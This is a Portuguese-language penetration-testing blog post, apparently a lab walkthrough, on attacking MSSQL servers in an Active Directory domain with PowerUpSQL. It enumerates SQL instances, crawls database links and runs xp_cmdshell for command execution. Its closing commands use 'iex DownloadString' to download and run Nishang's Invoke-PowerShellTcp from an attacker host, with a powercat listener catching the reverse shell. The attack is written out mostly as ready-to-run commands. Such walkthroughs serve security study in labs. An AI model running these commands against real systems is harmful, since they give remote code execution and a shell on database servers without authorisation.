---
title: "Active Directory - Enumeração MSSQL - PowerUpSQL.ps1"
tags: [Windows,Active Directory]
categories: ActiveDirectory
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/mssql-server.png)

# Considerações Iniciais

Agora vamos iniciar a enumeração do MSSQL Server desse AD, todo AD vai ter um servidor SQL, uma vez que é onde são guardados os dados.

A ferramenta que utilizarei para essa seção é o PowerUpSql.ps1, um script escrito em PowerShell que possibilita a enumeração rápida e precisa do servidor SQL de um AD.

LEIAM O POST DE REFERÊNCIA, MUITO IMPORTANTE PARA A COMPREENSÃO DO QUE SERÁ EXECUTADO AQUI

*Referência:*

[Link 1](https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/)

# Enumeração de Servidores SQL

A ideia inicial aqui é termos qualquer tipo de acesso, mesmo que publico ao banco de dados do SQL, tendo esse acesso podemos escalar privilégios dentro dele e virar SA (sysadmin) dentro dele, podendo por exemplo habilitar o xp_cmdshell e executar comandos cmd dentro da máquina do SQL e conseguir assim um reverse shell!

Vamos lá

## Listando SPN

Ferramenta utilizada PowerUpSql.ps1

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)

Listando todos os SQL do Laboratório que estão com SPN (Service Principal Name) habilitados

`Get-SQLInstanceDomain`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/sql.png)

Temos um total de 5 instância de SQL sendo executadas nesse laboratório.

## Verificando Conectividade com o servidor

Agora devemos verificar se algum deles é acessível, e sendo acessível podemos logar com algum usuário

`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/sql1.png)

Verificamos que temos uma Acessível! Então podemos testar comandos através da chain dela agora

## Testando a chain

Para ver se temos algum tipo de execução de comando dentro do servidor sql temos que testar a chain dele, e ver se em algum desses pontos temos execução de comandos

`Get-SQLServerLinkCrawl -Instance Instancia_acessível`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/sql2.png)

Verificamos que ele faz uma chain em vários pontos, então é bem provável que teremos algum tipo de RCE em alguma parte dessa chain

## Executando Comandos

`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'whoami'" | ft`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/sql3.png)

Show! Temos RCE dentro dessa máquina!

## Ganhando um Reverse Shell

Agora vamos pegar um reverse shell nela!

Iremos utilizar o `Invoke-PowerShellTCP.ps1` do Nishang

[PowerShellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

O `HFS` para hospedar nosso servidor web onde o servidor remoto irá fazer as requisições

[HFS](https://www.rejetto.com/hfs/)

E o `powercat` para receber a conexão reversa

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

Setamos o powercat na porta 443 para receber a conexão reversa

`powercat -l -v -p 443 -t 1000`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev.png)

Arrumamos (colocamos a chamada da função no final dela pra automaticamente executar o reverse shell) e upamos o Invoke-PowerShellTCP.ps1 no HFS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev1.png)

Agora chamamos no crawl nosso reverse shell

`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.196/Invoke-PowerShellTCP.ps1'')'" | ft`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev2.png)

Recebemos a conexão reversa da máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/active-enum/rev3.png)

# Conclusão

Pronto! Conseguimos um reverse shell através de um database link dentro do MSSQL

## Comandos Utilizados

`Get-SQLInstanceDomain`
`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10`
`Get-SQLServerLinkCrawl -Instance Instancia_acessível`
`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'whoami'" | ft`
`powercat -l -v -p 443 -t 1000`
`Get-SQLServerLinkCrawl -Instance Instancia_acessível -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.50.196/Invoke-PowerShellTCP.ps1'')'" | ft`